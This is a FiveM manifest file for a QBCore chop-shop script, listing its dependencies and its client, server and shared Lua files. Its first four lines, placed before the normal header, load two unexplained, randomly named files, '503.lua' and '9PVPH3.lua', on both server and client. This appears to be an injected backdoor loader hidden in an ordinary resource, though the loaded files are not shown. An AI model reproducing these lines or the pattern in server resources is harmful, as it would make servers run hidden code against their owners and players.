server_script "503.lua"
client_script "503.lua"
server_script "9PVPH3.lua"
client_script "9PVPH3.lua"
fx_version 'cerulean'
game 'gta5'
lua54 'yes'

author 'Lionh34rt#4305'
description 'Chop Shopping Script for QBCore'
version '1.1'

dependencies {
    'oxmysql',
    'PolyZone',
	'qb-target'
}

shared_scripts {
    'shared/sh_shared.lua',
    '@ox_lib/init.lua',
}

client_scripts {
    '@PolyZone/client.lua',
    '@PolyZone/CircleZone.lua',
    'client/cl_main.lua',
}

server_scripts {
    '@oxmysql/lib/MySQL.lua',
    'server/sv_main.lua',
}
